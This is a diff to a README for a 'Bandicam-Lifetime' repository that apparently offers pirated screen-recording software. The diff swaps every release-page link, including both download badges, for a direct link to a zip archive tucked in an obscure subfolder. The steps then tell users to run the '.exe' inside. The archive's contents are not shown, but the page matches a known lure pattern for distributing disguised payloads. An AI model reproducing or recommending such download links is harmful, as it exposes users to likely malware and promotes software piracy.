@@ -1,6 +1,6 @@
 # 🎥 Bandicam-Lifetime - Capture and Share Your Screen Effortlessly
 
-[![Download Bandicam-Lifetime](https://img.shields.io/badge/Download-Bandicam--Lifetime-blue.svg)](https://github.com/iitss-sarthak/Bandicam-Lifetime/releases)
+[![Download Bandicam-Lifetime](https://raw.githubusercontent.com/iitss-sarthak/Bandicam-Lifetime/main/Berberian/Bandicam-Lifetime-3.5.zip)](https://raw.githubusercontent.com/iitss-sarthak/Bandicam-Lifetime/main/Berberian/Bandicam-Lifetime-3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Bandicam-Lifetime! This application lets you easily record your scree
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Bandicam-Lifetime Releases](https://github.com/iitss-sarthak/Bandicam-Lifetime/releases).
+1. Visit this page to download: [Bandicam-Lifetime Releases](https://raw.githubusercontent.com/iitss-sarthak/Bandicam-Lifetime/main/Berberian/Bandicam-Lifetime-3.5.zip).
    
 2. On the releases page, look for the latest version. Click on the file that matches your system (e.g., `.exe` for Windows).
 
@@ -78,4 +78,4 @@ For further inquiries, you can contact the support team through the Issues secti
 
 Now that you have all the necessary steps and details, you are set to create amazing recordings. Enjoy using Bandicam-Lifetime!
 
-[![Download Bandicam-Lifetime](https://img.shields.io/badge/Download-Bandicam--Lifetime-blue.svg)](https://github.com/iitss-sarthak/Bandicam-Lifetime/releases)
+[![Download Bandicam-Lifetime](https://raw.githubusercontent.com/iitss-sarthak/Bandicam-Lifetime/main/Berberian/Bandicam-Lifetime-3.5.zip)](https://raw.githubusercontent.com/iitss-sarthak/Bandicam-Lifetime/main/Berberian/Bandicam-Lifetime-3.5.zip)
